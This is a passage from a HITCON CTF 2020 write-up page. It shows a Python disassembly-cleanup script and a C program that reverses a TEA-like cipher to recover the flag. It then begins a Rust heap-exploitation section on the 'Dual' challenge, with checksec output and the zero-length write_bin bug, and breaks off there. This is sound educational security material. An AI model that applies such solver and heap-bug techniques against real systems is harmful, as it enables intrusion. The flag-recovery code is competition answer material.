</span></span><span class=line><span class=cl>    <span class=n>tid_prctl_mov</span><span class=p>,</span> <span class=n>prctl_name_strcpy</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>readable_prctl</span><span class=p>,</span> <span class=n>seccomp_rules</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>arithmetic</span>
</span></span><span class=line><span class=cl><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=c1>#rules = []</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>rule</span> <span class=ow>in</span> <span class=n>rules</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=nb>len</span><span class=p>(</span><span class=n>disasm</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>res</span> <span class=o>=</span> <span class=n>rule</span><span class=p>(</span><span class=n>disasm</span><span class=p>[</span><span class=n>i</span><span class=p>:])</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>res</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>used</span><span class=p>,</span> <span class=n>res</span> <span class=o>=</span> <span class=n>res</span>
</span></span><span class=line><span class=cl>                <span class=k>assert</span> <span class=n>used</span> <span class=o>&gt;</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>                <span class=n>disasm</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=n>res</span>
</span></span><span class=line><span class=cl>                <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>i</span><span class=o>+</span><span class=mi>1</span><span class=p>,</span> <span class=n>i</span><span class=o>+</span><span class=n>used</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                    <span class=n>disasm</span><span class=p>[</span><span class=n>j</span><span class=p>]</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=k>match</span> <span class=o>=</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>        <span class=k>except</span> <span class=ne>IndexError</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>pass</span>
</span></span><span class=line><span class=cl>        <span class=n>i</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>disasm1</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>x</span> <span class=ow>in</span> <span class=n>disasm</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>x</span> <span class=o>!=</span> <span class=p>[]:</span>
</span></span><span class=line><span class=cl>            <span class=n>disasm1</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>x</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>disasm</span> <span class=o>=</span> <span class=n>disasm1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>disasm</span> <span class=o>=</span> <span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=s1>&#39; &#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>x</span><span class=p>)</span> <span class=k>for</span> <span class=n>x</span> <span class=ow>in</span> <span class=n>disasm</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>disasm</span><span class=p>)</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdint.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;ctype.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>round_fwd</span><span class=p>(</span><span class=kt>uint32_t</span> <span class=o>*</span><span class=n>_a</span><span class=p>,</span> <span class=kt>uint32_t</span> <span class=o>*</span><span class=n>_b</span><span class=p>,</span> <span class=kt>uint32_t</span> <span class=o>*</span><span class=n>k</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint32_t</span> <span class=n>a</span> <span class=o>=</span> <span class=o>*</span><span class=n>_a</span><span class=p>,</span> <span class=n>b</span> <span class=o>=</span> <span class=o>*</span><span class=n>_b</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kt>uint32_t</span> <span class=n>r2</span> <span class=o>=</span> <span class=n>k</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=n>r3</span> <span class=o>=</span> <span class=n>k</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=n>r4</span> <span class=o>=</span> <span class=n>k</span><span class=p>[</span><span class=mi>2</span><span class=p>],</span> <span class=n>r5</span> <span class=o>=</span> <span class=n>k</span><span class=p>[</span><span class=mi>3</span><span class=p>],</span> <span class=n>r9</span> <span class=o>=</span> <span class=n>k</span><span class=p>[</span><span class=mi>4</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint32_t</span> <span class=n>r6</span><span class=p>,</span> <span class=n>r7</span><span class=p>,</span> <span class=n>r8</span><span class=p>,</span> <span class=n>r10</span><span class=p>,</span> <span class=n>r11</span><span class=p>,</span> <span class=n>r12</span><span class=p>,</span> <span class=n>r13</span><span class=p>,</span> <span class=n>r14</span><span class=p>,</span> <span class=n>r15</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>r6</span> <span class=o>=</span> <span class=n>a</span><span class=p>;</span> <span class=n>r7</span> <span class=o>=</span> <span class=n>b</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>r8</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>r10</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span><span class=p>(</span><span class=kt>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=mi>32</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=c1>//r10 = 0;
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=n>r8</span> <span class=o>=</span> <span class=n>r8</span> <span class=o>+</span> <span class=n>r9</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>r11</span> <span class=o>=</span> <span class=n>r7</span> <span class=o>&lt;&lt;</span> <span class=mi>4</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>r11</span> <span class=o>=</span> <span class=n>r11</span> <span class=o>+</span> <span class=n>r2</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>r12</span> <span class=o>=</span> <span class=n>r7</span> <span class=o>&gt;&gt;</span> <span class=mi>5</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>r12</span> <span class=o>=</span> <span class=n>r12</span> <span class=o>+</span> <span class=n>r3</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>r11</span> <span class=o>=</span> <span class=n>r11</span> <span class=o>^</span> <span class=n>r12</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>r12</span> <span class=o>=</span> <span class=n>r7</span> <span class=o>+</span> <span class=n>r8</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>r11</span> <span class=o>=</span> <span class=n>r11</span> <span class=o>^</span> <span class=n>r12</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>r6</span> <span class=o>=</span> <span class=n>r6</span> <span class=o>+</span> <span class=n>r11</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>r11</span> <span class=o>=</span> <span class=n>r6</span> <span class=o>&lt;&lt;</span> <span class=mi>4</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>r11</span> <span class=o>=</span> <span class=n>r11</span> <span class=o>+</span> <span class=n>r4</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>r12</span> <span class=o>=</span> <span class=n>r6</span> <span class=o>&gt;&gt;</span> <span class=mh>0x5</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>r12</span> <span class=o>=</span> <span class=n>r12</span> <span class=o>+</span> <span class=n>r5</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>r11</span> <span class=o>=</span> <span class=n>r11</span> <span class=o>^</span> <span class=n>r12</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>r12</span> <span class=o>=</span> <span class=n>r6</span> <span class=o>+</span> <span class=n>r8</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>r11</span> <span class=o>=</span> <span class=n>r11</span> <span class=o>^</span> <span class=n>r12</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>r7</span> <span class=o>=</span> <span class=n>r7</span> <span class=o>+</span> <span class=n>r11</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>r10</span> <span class=o>=</span> <span class=n>r10</span> <span class=o>+</span> <span class=mh>0x1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=c1>//r11 = r10 &gt;&gt; 0x5;
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=c1>//r11 = 0x1 - r11;
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=c1>//r11 = r11 * 0xab;
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>        <span class=c1>//printf(&#34;%d 0x%08x 0x%08x\n&#34;, i, r6, r7);
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;0x%08x</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>r10</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>a</span> <span class=o>=</span> <span class=n>r6</span><span class=p>;</span> <span class=n>b</span> <span class=o>=</span> <span class=n>r7</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=o>*</span><span class=n>_a</span> <span class=o>=</span> <span class=n>a</span><span class=p>;</span> <span class=o>*</span><span class=n>_b</span> <span class=o>=</span> <span class=n>b</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>round_bk</span><span class=p>(</span><span class=kt>uint32_t</span> <span class=o>*</span><span class=n>_a</span><span class=p>,</span> <span class=kt>uint32_t</span> <span class=o>*</span><span class=n>_b</span><span class=p>,</span> <span class=kt>uint32_t</span> <span class=o>*</span><span class=n>k</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint32_t</span> <span class=n>a</span> <span class=o>=</span> <span class=o>*</span><span class=n>_a</span><span class=p>,</span> <span class=n>b</span> <span class=o>=</span> <span class=o>*</span><span class=n>_b</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint32_t</span> <span class=n>r2</span> <span class=o>=</span> <span class=n>k</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=n>r3</span> <span class=o>=</span> <span class=n>k</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=n>r4</span> <span class=o>=</span> <span class=n>k</span><span class=p>[</span><span class=mi>2</span><span class=p>],</span> <span class=n>r5</span> <span class=o>=</span> <span class=n>k</span><span class=p>[</span><span class=mi>3</span><span class=p>],</span> <span class=n>r9</span> <span class=o>=</span> <span class=n>k</span><span class=p>[</span><span class=mi>4</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint32_t</span> <span class=n>r6</span><span class=p>,</span> <span class=n>r7</span><span class=p>,</span> <span class=n>r8</span><span class=p>,</span> <span class=n>r10</span><span class=p>,</span> <span class=n>r11</span><span class=p>,</span> <span class=n>r12</span><span class=p>,</span> <span class=n>r13</span><span class=p>,</span> <span class=n>r14</span><span class=p>,</span> <span class=n>r15</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>r6</span> <span class=o>=</span> <span class=n>a</span><span class=p>;</span> <span class=n>r7</span> <span class=o>=</span> <span class=n>b</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>r8</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span><span class=p>(</span><span class=kt>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=mi>32</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>r8</span> <span class=o>=</span> <span class=n>r8</span> <span class=o>+</span> <span class=n>r9</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span><span class=p>(</span><span class=kt>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=mi>32</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>r11</span> <span class=o>=</span> <span class=n>r6</span> <span class=o>&lt;&lt;</span> <span class=mi>4</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>r11</span> <span class=o>=</span> <span class=n>r11</span> <span class=o>+</span> <span class=n>r4</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>r12</span> <span class=o>=</span> <span class=n>r6</span> <span class=o>&gt;&gt;</span> <span class=mh>0x5</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>r12</span> <span class=o>=</span> <span class=n>r12</span> <span class=o>+</span> <span class=n>r5</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>r11</span> <span class=o>=</span> <span class=n>r11</span> <span class=o>^</span> <span class=n>r12</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>r12</span> <span class=o>=</span> <span class=n>r6</span> <span class=o>+</span> <span class=n>r8</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>r11</span> <span class=o>=</span> <span class=n>r11</span> <span class=o>^</span> <span class=n>r12</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>r7</span> <span class=o>=</span> <span class=n>r7</span> <span class=o>-</span> <span class=n>r11</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>r11</span> <span class=o>=</span> <span class=n>r7</span> <span class=o>&lt;&lt;</span> <span class=mi>4</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>r11</span> <span class=o>=</span> <span class=n>r11</span> <span class=o>+</span> <span class=n>r2</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>r12</span> <span class=o>=</span> <span class=n>r7</span> <span class=o>&gt;&gt;</span> <span class=mi>5</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>r12</span> <span class=o>=</span> <span class=n>r12</span> <span class=o>+</span> <span class=n>r3</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>r11</span> <span class=o>=</span> <span class=n>r11</span> <span class=o>^</span> <span class=n>r12</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>r12</span> <span class=o>=</span> <span class=n>r7</span> <span class=o>+</span> <span class=n>r8</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>r11</span> <span class=o>=</span> <span class=n>r11</span> <span class=o>^</span> <span class=n>r12</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>r6</span> <span class=o>=</span> <span class=n>r6</span> <span class=o>-</span> <span class=n>r11</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>r8</span> <span class=o>=</span> <span class=n>r8</span> <span class=o>-</span> <span class=n>r9</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>a</span> <span class=o>=</span> <span class=n>r6</span><span class=p>;</span> <span class=n>b</span> <span class=o>=</span> <span class=n>r7</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=o>*</span><span class=n>_a</span> <span class=o>=</span> <span class=n>a</span><span class=p>;</span> <span class=o>*</span><span class=n>_b</span> <span class=o>=</span> <span class=n>b</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>uint32_t</span> <span class=n>k</span><span class=p>[</span><span class=mi>4</span><span class=p>][</span><span class=mi>5</span><span class=p>]</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span><span class=mh>0x69a33fff</span><span class=p>,</span><span class=mh>0x468932dc</span><span class=p>,</span><span class=mh>0x2b0b575b</span><span class=p>,</span><span class=mh>0x1e8b51cc</span><span class=p>,</span><span class=mh>0x51fdd41a</span><span class=p>},</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span><span class=mh>0x32e57ab6</span><span class=p>,</span><span class=mh>0x7785df55</span><span class=p>,</span><span class=mh>0x688620f9</span><span class=p>,</span><span class=mh>0x8df954f3</span><span class=p>,</span><span class=mh>0x5c37a6db</span><span class=p>},</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span><span class=mh>0xaca81571</span><span class=p>,</span><span class=mh>0x2c19574f</span><span class=p>,</span><span class=mh>0x1bd1fc38</span><span class=p>,</span><span class=mh>0x14220605</span><span class=p>,</span><span class=mh>0xb4f0b4fb</span><span class=p>},</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span><span class=mh>0x33f33fe0</span><span class=p>,</span><span class=mh>0xf9de7e36</span><span class=p>,</span><span class=mh>0xe9ab109d</span><span class=p>,</span><span class=mh>0x8d4f04b2</span><span class=p>,</span><span class=mh>0xd3c45f8c</span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>uint32_t</span> <span class=n>vals</span><span class=p>[</span><span class=mi>4</span><span class=p>][</span><span class=mi>2</span><span class=p>]</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span><span class=mh>0x152ceed2</span><span class=p>,</span> <span class=mh>0xd6046dc3</span><span class=p>},</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span><span class=mh>0x4a9d3ffd</span><span class=p>,</span> <span class=mh>0xbb541082</span><span class=p>},</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span><span class=mh>0x632a4f78</span><span class=p>,</span> <span class=mh>0x0a9cb93d</span><span class=p>},</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span><span class=mh>0x58aae351</span><span class=p>,</span> <span class=mh>0x92012a14</span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint8_t</span> <span class=n>_input</span><span class=p>[</span><span class=mi>8</span><span class=p>]</span> <span class=o>=</span> <span class=p>{</span><span class=sc>&#39;h&#39;</span><span class=p>,</span><span class=sc>&#39;i&#39;</span><span class=p>,</span><span class=sc>&#39;t&#39;</span><span class=p>,</span><span class=sc>&#39;c&#39;</span><span class=p>,</span><span class=sc>&#39;o&#39;</span><span class=p>,</span><span class=sc>&#39;n&#39;</span><span class=p>,</span><span class=sc>&#39;{&#39;</span><span class=p>,</span><span class=sc>&#39;a&#39;</span><span class=p>};</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint32_t</span> <span class=o>*</span><span class=n>input</span> <span class=o>=</span> <span class=p>(</span><span class=kt>uint32_t</span> <span class=o>*</span><span class=p>)</span><span class=n>_input</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span><span class=p>(</span><span class=kt>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=mi>4</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>input</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=n>vals</span><span class=p>[</span><span class=n>i</span><span class=p>][</span><span class=mi>0</span><span class=p>];</span>
</span></span><span class=line><span class=cl>        <span class=n>input</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=n>vals</span><span class=p>[</span><span class=n>i</span><span class=p>][</span><span class=mi>1</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nf>round_bk</span><span class=p>(</span><span class=o>&amp;</span><span class=n>input</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=o>&amp;</span><span class=n>input</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=n>k</span><span class=p>[</span><span class=n>i</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>        <span class=c1>//printf(&#34;0x%08x 0x%08x\n&#34;, input[0], input[1]);
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>        <span class=k>for</span><span class=p>(</span><span class=kt>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=mi>8</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=nf>putchar</span><span class=p>(</span><span class=nf>isprint</span><span class=p>(</span><span class=n>_input</span><span class=p>[</span><span class=n>i</span><span class=p>])</span> <span class=o>?</span> <span class=n>_input</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>:</span> <span class=sc>&#39;@&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=nf>putchar</span><span class=p>(</span><span class=sc>&#39;\n&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><h2 class="relative group">Run run run<div id=run-run-run class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#run-run-run aria-label=Anchor>#</a></span></h2><p>This writeup is available
<a href=http://www.babush.me/hitcon-ctf-2020-writeup.html target=_blank><strong>here</strong></a>.</p><h2 class="relative group">L&rsquo;ObscuritÃ©<div id=lobscuritÃ© class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#lobscurit%c3%a9 aria-label=Anchor>#</a></span></h2><p>This writeup is available
<a href=http://www.babush.me/hitcon-ctf-2020-writeup.html target=_blank><strong>here</strong></a>.</p><h2 class="relative group">Dual<div id=dual class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#dual aria-label=Anchor>#</a></span></h2><blockquote><p>Heap exploitation in Rust? Is there any hope? Yes if you implement your own
Garbage Collector.</p></blockquote><h3 class="relative group">The program<div id=the-program class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#the-program aria-label=Anchor>#</a></span></h3><p>The binary doesn&rsquo;t have any hard mitigations:</p><pre tabindex=0><code>RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	ymbols		FORTIFY	Fortified	Fortifiable	FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   3950) Symbols	  No	0		12		dual-2df8d4005c5d4ffc03183a96a5d9cb55ac4ee56dfb589d65b0bf4501a586a4b0
</code></pre><h3 class="relative group">The vulnerability<div id=the-vulnerability class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#the-vulnerability aria-label=Anchor>#</a></span></h3><p>The struct of the Nodes of the Graph is:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-rust data-lang=rust><span class=line><span class=cl><span class=k>struct</span> <span class=nc>Node</span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>id</span>: <span class=kt>u64</span><span class=p>,</span><span class=w>              </span><span class=c1>// 0x0 id of the node
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=w>    </span><span class=n>this_index</span>: <span class=kt>u64</span><span class=p>,</span><span class=w>      </span><span class=c1>// 0x8 index of the current obj inside of the pool
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=w>    </span><span class=n>edges</span>: <span class=nb>Vec</span><span class=o>&lt;</span><span class=kt>u64</span><span class=o>&gt;</span><span class=p>,</span><span class=w>      </span><span class=c1>// 0x10 ptr to the vector of neighbours
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=w>    </span><span class=n>last_edge</span>: <span class=o>*</span><span class=kt>u64</span><span class=p>,</span><span class=w>      </span><span class=c1>// 0x18 ptr to the last edge in the vector of neighbours
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=w>    </span><span class=n>edges_end</span>: <span class=o>*</span><span class=kt>u64</span><span class=p>,</span><span class=w>      </span><span class=c1>// 0x20 ptr to the end of the vector of neighbours
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=w>    </span><span class=n>text_len</span>: <span class=kt>u64</span><span class=p>,</span><span class=w>        </span><span class=c1>// 0x28 Len of the text
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=w>    </span><span class=n>text_index</span>: <span class=kt>u64</span><span class=p>,</span><span class=w>      </span><span class=c1>// 0x30 Index to the text obj in the pool
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=w>    </span><span class=n>stamp</span>: <span class=kt>u64</span><span class=p>,</span><span class=w>           </span><span class=c1>// 0x38 operation stamp (not really usefull for pwning)
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></div><p>After <del>fuzzing</del> playing with the binary we found out that using <code>write_bin</code>
with length 0 causes a bug.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-rust data-lang=rust><span class=line><span class=cl><span class=k>fn</span> <span class=nf>write_bin</span><span class=p>(){</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=fm>println!</span><span class=p>(</span><span class=s>&#34;node_id&gt;&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>let</span><span class=w> </span><span class=n>node_id</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>read_int</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>let</span><span class=w> </span><span class=n>node</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>match</span><span class=w> </span><span class=n>find_node</span><span class=p>(</span><span class=n>root</span><span class=p>,</span><span class=w> </span><span class=n>node_id</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=nb>Some</span><span class=p>(</span><span class=n>node</span><span class=p>)</span><span class=w> </span><span class=o>=&gt;</span><span class=w> </span><span class=n>node</span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=nb>None</span><span class=w> </span><span class=o>=&gt;</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=fm>println!</span><span class=p>(</span><span class=s>&#34;invalid&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>return</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>};</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
